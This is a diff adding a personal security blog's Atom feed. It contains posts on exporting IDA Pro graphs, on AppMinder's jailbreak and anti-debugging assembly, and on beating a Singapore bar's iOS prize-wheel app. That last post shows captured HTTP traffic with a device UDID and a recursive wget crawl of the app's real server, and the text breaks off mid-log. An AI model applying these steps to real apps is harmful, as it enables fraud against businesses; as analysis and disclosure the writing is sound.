@@ -1,0 +1,796 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+<title type="text">Pankaj Kohli</title>
+<generator uri="https://github.com/jekyll/jekyll">Jekyll</generator>
+<link rel="self" type="application/atom+xml" href="/feed.xml" />
+<link rel="alternate" type="text/html" href="" />
+<updated>2015-11-14T09:31:33+08:00</updated>
+<id>/</id>
+<author>
+  <name>Pankaj Kohli</name>
+  <uri>/</uri>
+  
+</author>
+
+
+  
+
+<entry>
+  <title type="html"><![CDATA[Converting IDA Pro graphs to images]]></title>
+  <link rel="alternate" type="text/html" href="/posts/converting-ida-pro-graphs-to-images.html" />
+  <id>/posts/converting-ida-pro-graphs-to-images</id>
+  <published>2015-05-16T23:23:25+08:00</published>
+  <updated>2015-05-16T23:23:25+08:00</updated>
+  <author>
+    <name>Pankaj Kohli</name>
+    <uri></uri>
+    
+  </author>
+  <content type="html">
+    &lt;p&gt;It’s been a long time since my last post. I have been busy with work, and (thanks to IPR) could not post anything. This post is about a much needed feature in IDA Pro (specifically the wingraph32 utility), saving the graph as an image.&lt;/p&gt;
+
+&lt;p&gt;IDA Pro provides an interesting feature to view the disassembly of a function as a flowchart. The flowchart shows the function in the form of a control flow graph, where each node in the graph represents a basic block and each edge represents a control transfer. In many instances, one would like to export it as an image. However, the wingraph32 utility does not provide such an option.&lt;/p&gt;
+
+&lt;figure align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/images/wingraph32.png&quot; /&gt;
+    &lt;figcaption&gt;A graph shown by wingraph32&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;The graph can be exported from IDA Pro (or from wingraoh32) as a .gdl (graph description language) file. GDL file is a text representation of graph, and can be opened using a text editor. It can be converted into an image using the &lt;a href=&quot;http://search.cpan.org/dist/Graph-Easy/bin/graph-easy&quot;&gt;Graph::Easy&lt;/a&gt; CPAN module.&lt;/p&gt;
+
+&lt;p&gt;To convert it into a PNG (or any other format) image, first install the Graph::Easy CPAN module. It requires &lt;a href=&quot;http://www.graphviz.org/&quot;&gt;Graphviz&lt;/a&gt; to run, so install that as well.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cpan Graph::Easy&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, convert the .gdl file to an image.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;graph-easy --from gdl --input&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;graph.gdl --png --output&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;graph.png&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This is how the final image of the above graph looks like.&lt;/p&gt;
+
+&lt;figure align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/images/graph.png&quot; /&gt;
+    &lt;figcaption&gt;Graph produced by graph_easy&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;/posts/converting-ida-pro-graphs-to-images.html&quot;&gt;Converting IDA Pro graphs to images&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on May 16, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+  
+
+<entry>
+  <title type="html"><![CDATA[AppMinder jailbreak detection analysis]]></title>
+  <link rel="alternate" type="text/html" href="/posts/appminder-jailbreak-detection-analysis.html" />
+  <id>/posts/appminder-jailbreak-detection-analysis</id>
+  <published>2013-12-28T20:38:07+08:00</published>
+  <updated>2013-12-28T20:38:07+08:00</updated>
+  <author>
+    <name>Pankaj Kohli</name>
+    <uri></uri>
+    
+  </author>
+  <content type="html">
+    &lt;p&gt;Neso Lab’s &lt;a href=&quot;http://appminder.nesolabs.de/&quot;&gt;AppMinder&lt;/a&gt; project is another attempt at providing jailbreak detection for enterprise iOS applications (and perhaps AppStore apps). It provides three variants of jailbreak detections codes, each with an increasing level of self integrity checks and code obfuscation, and optionally including anti-debugging checks. It generates a piece of code with a function containing inline assembly code which can be inserted into the app’s source code and called where jailbreak detection needs to be implemented. The generated code is metamorphic with a random function name. Metamorphism is achieved by a combination of register interchanges, instruction reordering, inserting dead code such as unused &lt;code&gt;push&lt;/code&gt;, &lt;code&gt;pop&lt;/code&gt; and &lt;code&gt;cmp&lt;/code&gt; instructions.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#if !(TARGET_IPHONE_SIMULATOR)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;always_inline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;FsNZKlEjkXtDxShPvqbttYCo&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;mov r0, r0;mov r2, #152;sub r0, r2, #121;sub r1, r1;mov r2, #1;sub r2, #1;sub r3, r3;mov r4, #23;add r12, r4, #3;svc 0x80;mov r0, #76;mov r1, #2;b #2;push {r0-r12};mov r12, r1;b #2;pop {r0-r15};sub r1, r1, r1;b #1;cmp r0, r10;mov r0, r1;svc 0x80;cmp r0, #1;b #2;stmdb sp!, {r0-r12};bne #1;b #8;mov r0, #1;mov r12, #1;svc 0x80;mov r2, #12;sub r2, r2, r0;add r2, pc;bx r2;mov r0, #1;mov r12, #1;svc 0x80;b #1;cmp r0, r10;mov r1, r1;sub r1, r1, r1;b #2;push {r0-r12};mov r0, r1;mov r12, #256;asr r12, #7;b #1;cmp r0, r10;mov r1, #29;mov r0, r1;b #2;stmdb sp!, {r0-r12};svc 0x80;mov r2, r2;sub r1, r1, r1;mov r1, r1;mov r3, r1;add r3, r3, #1;cmp r0, r3;mov r2, r2;beq #8;mov r0, #1;mov r12, #1;svc 0x80;mov r1, r0;add r0, r0, #3;add r0, pc;mov pc, r0;pop {r0-r15};mov r0, r1;mov r0, r0;mov r3, #34;sub r0, r3, #3;sub r2, r2;mov r1, r2;sub r2, r2;sub r12, r12;mov r3, r12;mov r4, #193;sub r12, r4, #167;svc 0x80;b #2;pop {r0-r15};&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r1&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r2&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r3&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r4&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;r12&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;cc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;memory&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#endif&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The code can be made a little more readable using &lt;code&gt;cat jbdetect.c | tr ';' '\n'&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The code makes use of &lt;code&gt;svc 0x80&lt;/code&gt; instruction throughout to invoke system calls. &lt;code&gt;svc 0x80&lt;/code&gt; is the ARM counterpart of Intel’s &lt;code&gt;int 0x80&lt;/code&gt; instruction, used to invoke system calls. In iOS, which is a derivative of Darwin, the system call number is passed in r12 and the arguments in r0-r3. The return value is optionally returned in r0. &lt;code&gt;svc&lt;/code&gt; also goes by the name of &lt;code&gt;swi&lt;/code&gt; or &lt;em&gt;software interrupt&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;debugger-detection&quot;&gt;Debugger detection&lt;/h2&gt;
+
+&lt;p&gt;Process tracing utilities and debuggers make use of &lt;code&gt;ptrace&lt;/code&gt; system call to trace a running process. If the ‘Anti-debugging option’ was selected, the code tries to detect and deny any debugging attempts. It does this by invoking &lt;code&gt;ptrace&lt;/code&gt; (system call 26) on the current process with an argument of 31, i.e. &lt;code&gt;PT_DENY_ATTACH&lt;/code&gt;. Quoting from the man page:&lt;/p&gt;
+
+&lt;figure align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/images/ptrace.png&quot; /&gt;
+    &lt;figcaption&gt;PT_DENY_ATTACH in the man page&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;The process is killed if a debugger is detected. Additionally, debuggers are denied to trace the process in any future requests. gdb shows a “Operation not permitted” message if it tries to attach to a process which has called &lt;code&gt;ptrace&lt;/code&gt; with &lt;code&gt;PT_DENY_ATTACH&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;A complete list of system calls can be found in &lt;a href=&quot;http://www.opensource.apple.com/source/xnu/xnu-1228.5.20/bsd/sys/syscall.h&quot;&gt;sys/syscall.h&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;jailbreak-detection&quot;&gt;Jailbreak Detection&lt;/h2&gt;
+
+&lt;p&gt;The code detects jailbreaks using &lt;code&gt;fork&lt;/code&gt;. On non-jailbroken iOS, the sandbox restricts the use of &lt;code&gt;fork&lt;/code&gt;. Calling &lt;code&gt;fork&lt;/code&gt; fails with a return value of 1. However, on a jailbroken iOS, &lt;code&gt;fork&lt;/code&gt; succeeds and spawns a new process. The code terminates the process using &lt;code&gt;exit(1)&lt;/code&gt; if &lt;code&gt;fork&lt;/code&gt; does not return 1.&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;p&gt;The code does not do anything new, and does not even conceal its presence. It can be easily identified in memory by simply looking for &lt;code&gt;svc 0x80&lt;/code&gt; instructions, which assemble to &lt;code&gt;80 00 00 EF&lt;/code&gt;. Given the fact that jailbreak detection is inherently self defeating, it becomes trivial to bypass the above checks.&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;/posts/appminder-jailbreak-detection-analysis.html&quot;&gt;AppMinder jailbreak detection analysis&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on December 28, 2013.&lt;/p&gt;
+  </content>
+</entry>
+
+
+  
+
+<entry>
+  <title type="html"><![CDATA[Dirty Harry: Hacking for free drinks in Singapore]]></title>
+  <link rel="alternate" type="text/html" href="/posts/dirty-harry-hacking-for-free-drinks-in-singapore.html" />
+  <id>/posts/dirty-harry-hacking-for-free-drinks-in-singapore</id>
+  <published>2013-11-04T00:38:07+08:00</published>
+  <updated>2013-11-04T00:38:07+08:00</updated>
+  <author>
+    <name>Pankaj Kohli</name>
+    <uri></uri>
+    
+  </author>
+  <content type="html">
+    &lt;p&gt;&lt;a href=&quot;http://harrys.com.sg/&quot;&gt;Harry’s bar&lt;/a&gt; is one of the most popular bar chains in Singapore. It has an iOS app “Appy Hour” that lets users spin the Harry’s “wheel of fortune” to win free drinks. The way it works is that a user would visit one of their strategically located bars and check in using the app. He would then spin the wheel, and if he is lucky, he would win a free drink. A time limit is imposed so that a user can spin the wheel only once in 24 hours while signed in a particular bar.&lt;/p&gt;
+
+&lt;p&gt;Now there may not be any such thing as a free lunch, but there are free drinks! Let’s see how.&lt;/p&gt;
+
+&lt;figure align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/images/win240x360.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&quot;the-luck-factor&quot;&gt;The ‘luck factor’&lt;/h2&gt;
+
+&lt;p&gt;The app communicates with &lt;code&gt;www.exhost.se&lt;/code&gt; over HTTP. When started, the first thing the app does is to define the “luck factor” of the user, by downloading an XML file containing probabilities of various prizes. The probabilities are set in way such that 52% of the time a spin would yield ‘Better Luck Next Time’.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/harrys_1_1_beta/venues.xml&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;www.exhost.se&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Appy Hour 1.1.0 (iPhone; iPhone OS 6.0.1; en_SG)&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;gzip&lt;/span&gt;
+
+HTTP/1.1 200 OK
+Age: 1659
+Connection: Keep-Alive
+Content-Length: 3071
+Content-Type: application/xml
+Date: Fri, 01 Nov 2013 06:27:45 GMT
+ETag: &amp;quot;3c8066-bff-4d7ddfaa98300&amp;quot;
+Last-Modified: Thu, 14 Mar 2013 08:05:00 GMT
+Server: Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/0.9.8e-fips-rhel5 DAV/2 mod_bwlimited/1.4 mod_fcgid/2.3.6
+Via: 1.1 qt-mfc4:80
+ 
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;Prizes&amp;gt;
+&amp;lt;Prize&amp;gt;
+&amp;lt;Description&amp;gt;Better Luck*Next Time&amp;lt;/Description&amp;gt;
+&amp;lt;Units&amp;gt;1&amp;lt;/Units&amp;gt;
+&amp;lt;ID&amp;gt;1&amp;lt;/ID&amp;gt;
+&amp;lt;Active&amp;gt;1&amp;lt;/Active&amp;gt;
+&amp;lt;Possibility&amp;gt;13&amp;lt;/Possibility&amp;gt;
+&amp;lt;IsPrize&amp;gt;0&amp;lt;/IsPrize&amp;gt;
+&amp;lt;PrizeFile&amp;gt;img/1.png&amp;lt;/PrizeFile&amp;gt;
+&amp;lt;/Prize&amp;gt;
+&amp;lt;Prize&amp;gt;
+&amp;lt;Description&amp;gt;1-for-1 Bacardi*Sup Gls&amp;lt;/Description&amp;gt;
+&amp;lt;Units&amp;gt;1&amp;lt;/Units&amp;gt;
+&amp;lt;ID&amp;gt;2&amp;lt;/ID&amp;gt;
+&amp;lt;Active&amp;gt;1&amp;lt;/Active&amp;gt;
+&amp;lt;Possibility&amp;gt;5&amp;lt;/Possibility&amp;gt;
+&amp;lt;IsPrize&amp;gt;1&amp;lt;/IsPrize&amp;gt;
+&amp;lt;PrizeFile&amp;gt;img/2.png&amp;lt;/PrizeFile&amp;gt;
+&amp;lt;/Prize&amp;gt;
+--snipped--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;time-restriction&quot;&gt;Time Restriction&lt;/h2&gt;
+
+&lt;p&gt;Once the user has checked in the bar, the app checks if the user has already tried his luck in the past 24 hours in the same bar. It does so by sending a request with the iPhone’s UDID, a timestamp and the bar’s id. The response simply consists of &lt;code&gt;true&lt;/code&gt; if the user is allowed to spin the wheel, or &lt;code&gt;false&lt;/code&gt; otherwise.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/harrys_1_1_beta/fetchdata.php?udid=aba5372762118af8f6f0594f836cd0eb32d10986&amp;amp;time=2013-01-11%02:56:15&amp;amp;venue=30&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;www.exhost.se&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Appy Hour 1.1.0 (iPhone; iPhone OS 6.0.1; en_SG)&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;gzip&lt;/span&gt;
+
+HTTP/1.1 200 OK
+Date: Fri, 01 Nov 2013 06:56:16 GMT
+Server: Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/0.9.8e-fips-rhel5 DAV/2 mod_bwlimited/1.4 mod_fcgid/2.3.6
+X-Powered-By: PHP/5.3.10
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html
+
+true&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;getting-past-everything&quot;&gt;Getting past everything&lt;/h2&gt;
+
+&lt;p&gt;Well, the simplest way to get past everything would be to make the app communicate with another server instead of &lt;code&gt;www.exhost.se&lt;/code&gt;. First we will crawl &lt;code&gt;www.exhost.se&lt;/code&gt; to get all the required files. The link &lt;code&gt;http://www.exhost.se/harrys_1_1_beta/&lt;/code&gt; does not contain a default &lt;code&gt;index.html&lt;/code&gt; or similar file, which makes crawling possible.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget -nv -r --no-parent --reject &lt;span class=&quot;s2&quot;&gt;&amp;quot;index.html*&amp;quot;&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/
+
+2013-11-03 23:37:09 URL:http://www.exhost.se/harrys_1_1_beta/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;639/639&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; /&lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/index.html&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 
+http://www.exhost.se/robots.txt:
+2013-11-03 23:37:09 ERROR 404: Not Found.
+2013-11-03 23:37:10 URL:http://www.exhost.se/harrys_1_1_beta/cms.php &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;169&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/cms.php&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:10 URL:http://www.exhost.se/harrys_1_1_beta/connect.php &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0/0&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/connect.php&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:10 URL:http://www.exhost.se/harrys_1_1_beta/fetchdata.php &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/fetchdata.php&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:11 URL:http://www.exhost.se/harrys_1_1_beta/img/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1037/1037&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/index.html&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:11 URL:http://www.exhost.se/harrys_1_1_beta/js/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;461/461&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/js/index.html&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:12 URL:http://www.exhost.se/harrys_1_1_beta/venues.xml &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3071/3071&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/venues.xml&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:19 URL:http://www.exhost.se/harrys_1_1_beta/img/1.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;50769/50769&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/1.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:23 URL:http://www.exhost.se/harrys_1_1_beta/img/10.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;62543/62543&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/10.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:24 URL:http://www.exhost.se/harrys_1_1_beta/img/11.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;23376/23376&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/11.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:26 URL:http://www.exhost.se/harrys_1_1_beta/img/12.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;33471/33471&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/12.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:29 URL:http://www.exhost.se/harrys_1_1_beta/img/13.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;58419/58419&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/13.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:31 URL:http://www.exhost.se/harrys_1_1_beta/img/14.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;50769/50769&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/14.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:32 URL:http://www.exhost.se/harrys_1_1_beta/img/15.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;50119/50119&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/15.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:33 URL:http://www.exhost.se/harrys_1_1_beta/img/16.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;23376/23376&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/16.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:34 URL:http://www.exhost.se/harrys_1_1_beta/img/2.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;44208/44208&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/2.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:36 URL:http://www.exhost.se/harrys_1_1_beta/img/3.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;62543/62543&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/3.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:38 URL:http://www.exhost.se/harrys_1_1_beta/img/4.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;50769/50769&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/4.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
